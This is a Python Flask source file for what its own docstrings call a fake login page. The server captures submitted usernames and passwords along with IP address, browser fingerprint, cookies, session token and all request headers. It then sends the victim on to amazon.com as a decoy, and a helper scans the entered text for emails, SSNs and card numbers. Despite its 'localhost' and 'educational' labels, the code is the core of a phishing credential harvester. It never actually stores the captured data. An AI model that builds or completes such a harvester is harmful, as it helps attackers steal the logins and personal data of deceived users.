# Run only on localhost for testing and learning.
from flask import Flask, request, render_template, redirect, url_for, jsonify, session
import datetime
import os
import platform
import socket
import uuid
import json
import re
import hashlib
import base64
import psutil
from urllib.parse import urlparse
import time
import threading
from functools import wraps
from user_agents import parse
import logging

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secure random secret key for sessions

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

# Statistics tracking
stats = {
    "total_visits": 0,
    "total_submissions": 0,
    "unique_ips": set(),
    "browsers": {},
    "operating_systems": {},
    "countries": {},
    "start_time": datetime.datetime.now()
}

def rate_limit(max_requests=5, window=60):
    """Rate limiting decorator to prevent abuse"""
    request_history = {}
    
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            now = time.time()
            
            # Clean old entries
            request_history[ip] = [t for t in request_history.get(ip, []) if now - t < window]
            
            # Check if rate limit exceeded
            if len(request_history.get(ip, [])) >= max_requests:
                return jsonify({"error": "Rate limit exceeded"}), 429
            
            # Add current request timestamp
            request_history.setdefault(ip, []).append(now)
            
            return f(*args, **kwargs)
        return wrapped
    return decorator

def get_client_fingerprint():
    """Generate a unique fingerprint for the client"""
    user_agent = request.headers.get('User-Agent', '')
    accept_lang = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    
    # Create a fingerprint from available headers
    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}"
    return hashlib.sha256(fingerprint_data.encode()).hexdigest()

def analyze_password(password):
    """Analyze password strength and characteristics"""
    analysis = {
        "length": len(password),
        "has_uppercase": any(c.isupper() for c in password),
        "has_lowercase": any(c.islower() for c in password),
        "has_digit": any(c.isdigit() for c in password),
        "has_special": any(not c.isalnum() for c in password),
        "common_patterns": []
    }
    
    # Check for common patterns
    common_patterns = [
        (r'123', 'sequential numbers'),
        (r'abc', 'sequential letters'),
        (r'qwerty', 'keyboard pattern'),
        (r'password', 'common password'),
        (r'admin', 'common password'),
        (r'\d{4}$', 'ends with 4 digits (possible year)'),
        (r'^\d{1,2}/\d{1,2}', 'possible date format')
    ]
    
    for pattern, description in common_patterns:
        if re.search(pattern, password.lower()):
            analysis["common_patterns"].append(description)
    
    # Calculate entropy (simple version)
    char_set_size = sum([
        10 if analysis["has_digit"] else 0,
        26 if analysis["has_lowercase"] else 0,
        26 if analysis["has_uppercase"] else 0,
        33 if analysis["has_special"] else 0  # Approximate number of special chars
    ])
    
    if char_set_size > 0:
        analysis["entropy"] = round(len(password) * (char_set_size.bit_length()), 2)
    else:
        analysis["entropy"] = 0
        
    # Strength rating
    if analysis["length"] < 8:
        analysis["strength"] = "Very Weak"
    elif analysis["length"] < 10 and len(analysis["common_patterns"]) > 0:
        analysis["strength"] = "Weak"
    elif analysis["entropy"] < 50:
        analysis["strength"] = "Moderate"
    elif analysis["entropy"] < 80:
        analysis["strength"] = "Strong"
    else:
        analysis["strength"] = "Very Strong"
        
    return analysis

def extract_potential_data(text):
    """Extract potential sensitive data from text"""
    patterns = {
        "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        "phone": r'(\+\d{1,3}[\s-]?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}',
        "ssn": r'\d{3}-\d{2}-\d{4}',
        "credit_card": r'\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}',
        "ip_address": r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
        "url": r'https?://[^\s<>"]+|www\.[^\s<>"]+',
    }
    
    results = {}
    for data_type, pattern in patterns.items():
        matches = re.findall(pattern, text)
        if matches:
            results[data_type] = matches
            
    return results

def update_statistics(data):
    """Update global statistics (in-memory, ephemeral)"""
    try:
        stats["total_submissions"] += 1
        ip = data.get("client_info", {}).get("ip_address")
        if ip:
            stats["unique_ips"].add(ip)

        browser = data.get("client_info", {}).get("browser", "Unknown")
        stats["browsers"][browser] = stats["browsers"].get(browser, 0) + 1

        os_info = data.get("client_info", {}).get("operating_system", "Unknown")
        stats["operating_systems"][os_info] = stats["operating_systems"].get(os_info, 0) + 1

        country = data.get("client_info", {}).get("geolocation", {}).get("country", "Unknown")
        stats["countries"][country] = stats["countries"].get(country, 0) + 1
    except Exception:
        pass

def background_analysis(session_id, captured_data):
    """Perform background analysis of captured data"""
    try:
        # Simulate intensive analysis
        time.sleep(1)
        
        # Analyze username and password patterns
        username = captured_data["credentials"]["username"]
        password = captured_data["credentials"]["password"]
        
        analysis = {
            "timestamp": datetime.datetime.now().isoformat(),
            "session_id": session_id,
            "password_analysis": analyze_password(password),
            "extracted_data": {
                "from_username": extract_potential_data(username),
                "from_password": extract_potential_data(password)
            },
            "correlation": {}
        }
        
        # Check if password contains username
        if username.lower() in password.lower():
            analysis["correlation"]["password_contains_username"] = True
        
        # Check if password contains common username variations
        username_variations = [
            username.lower(),
            username.lower().replace(' ', ''),
            ''.join(w[0] for w in username.lower().split() if w)  # initials
        ]
        
        for variation in username_variations:
            if variation and len(variation) > 2 and variation in password.lower():
                analysis["correlation"]["password_contains_username_variation"] = True
                break
    except Exception:
        pass

@app.route('/')
@rate_limit(max_requests=10, window=60)
def login_page():
    """Serves the fake login page."""
    # Track visit
    stats["total_visits"] += 1
    
    # Generate and store a session token
    if 'session_token' not in session:
        session['session_token'] = base64.urlsafe_b64encode(os.urandom(24)).decode('utf-8')
        session['first_visit'] = datetime.datetime.now().isoformat()
    
    # Track page load time
    session['page_load_time'] = datetime.datetime.now().isoformat()
    
    return render_template('login.html')

@app.route('/submit_login', methods=['POST'])
def submit_login():
    """Handles the submitted login form data."""
    if request.method == 'POST':
        # Basic form data
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        timestamp = datetime.datetime.now().isoformat()
        
        # Generate a unique session ID
        session_id = str(uuid.uuid4())
        
        # Collect client information
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        parsed_ua = parse(user_agent)
        browser = f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}"
        os_info = f"{parsed_ua.os.family} {parsed_ua.os.version_string}"
        device_info = f"{parsed_ua.device.family} {parsed_ua.device.brand} {parsed_ua.device.model}"
        is_mobile = parsed_ua.is_mobile
        is_tablet = parsed_ua.is_tablet
        is_pc = parsed_ua.is_pc
        is_bot = parsed_ua.is_bot
        
        # Network information
        referrer = request.headers.get('Referer', 'Unknown')
        origin = request.headers.get('Origin', 'Unknown')
        host = request.headers.get('Host', 'Unknown')
        
        # Browser capabilities and preferences
        accept_language = request.headers.get('Accept-Language', 'Unknown')
        accept_encoding = request.headers.get('Accept-Encoding', 'Unknown')
        dnt = request.headers.get('DNT', 'Unknown')  # Do Not Track
        
        # Cookies and session data
        cookies = {key: value for key, value in request.cookies.items()}
        session_token = session.get('session_token', 'No session token')
        first_visit = session.get('first_visit', 'Unknown')
        page_load_time = session.get('page_load_time', 'Unknown')
        time_on_page = (datetime.datetime.now() - datetime.datetime.fromisoformat(page_load_time)).total_seconds() if page_load_time != 'Unknown' else 'Unknown'
        
        # Extract potential email from username
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        email = re.search(email_pattern, username)
        email = email.group(0) if email else "Not found"
        
        # Get client fingerprint
        fingerprint = get_client_fingerprint()
        
        # Server information
        server_info = {
            "hostname": socket.gethostname(),
            "server_os": platform.system() + " " + platform.release(),
            "python_version": platform.python_version(),
            "server_time": timestamp,
            "server_timezone": datetime.datetime.now().astimezone().tzinfo.tzname(None),
            "cpu_usage": psutil.cpu_percent(),
            "memory_usage": psutil.virtual_memory().percent
        }
        
        # Create comprehensive data object
        captured_data = {
            "timestamp": timestamp,
            "session_id": session_id,
            "credentials": {
                "username": username,
                "password": password,
                "possible_email": email
            },
            "client_info": {
                "ip_address": ip_address,
                "user_agent": user_agent,
                "browser": browser,
                "operating_system": os_info,
                "device": device_info,
                "is_mobile": is_mobile,
                "is_tablet": is_tablet,
                "is_pc": is_pc,
                "is_bot": is_bot,
                "fingerprint": fingerprint,
                "referrer": referrer,
                "referrer_domain": urlparse(referrer).netloc if referrer != 'Unknown' else 'Unknown',
                "origin": origin,
                "host": host,
                "accept_language": accept_language,
                "accept_encoding": accept_encoding,
                "do_not_track": dnt,
                "cookies": cookies,
                "session_token": session_token,
                "first_visit": first_visit,
                "time_on_page": time_on_page
            },
            "server_info": server_info,
            "form_data": dict(request.form),
            "request_headers": dict(request.headers),
            "meta": {
                "capture_version": "2.0",
                "notes": "Educational demonstration only"
            }
        }

        # Redirect to a success/decoy page after submission
        return redirect(url_for('success_page'))

    # If not POST, redirect back to login
    return redirect(url_for('login_page'))

@app.route('/success')
def success_page():
    """Redirects to Amazon after form submission"""
    return redirect("https://www.amazon.com")

@app.route('/api/stats', methods=['GET'])
@rate_limit(max_requests=3, window=60)
def api_stats():
    """Provides a simple API to check captured data stats."""
    try:
        unique_ips = len(stats["unique_ips"])
        uptime = (datetime.datetime.now() - stats["start_time"]).total_seconds()
        
        return jsonify({
            "status": "success",
            "unique_visitors": unique_ips,
            "total_visits": stats["total_visits"],
            "server_time": datetime.datetime.now().isoformat(),
            "uptime_seconds": uptime,
            "top_browsers": dict(sorted(stats["browsers"].items(), key=lambda x: x[1], reverse=True)[:5]),
            "top_operating_systems": dict(sorted(stats["operating_systems"].items(), key=lambda x: x[1], reverse=True)[:5]),
            "top_countries": dict(sorted(stats["countries"].items(), key=lambda x: x[1], reverse=True)[:5]),
            "server_health": {
                "cpu_usage": psutil.cpu_percent(),
                "memory_usage": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage('/').percent
            }
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    # Runs the Flask development server.
    # Debug=True provides helpful error messages but should be OFF
    # in any non-development environment.
    # Host='127.0.0.1' (default) keeps it strictly on your machine.
    try:
        app.run(host='127.0.0.1', port=5000, debug=True)
    except Exception as e:
        print(e)
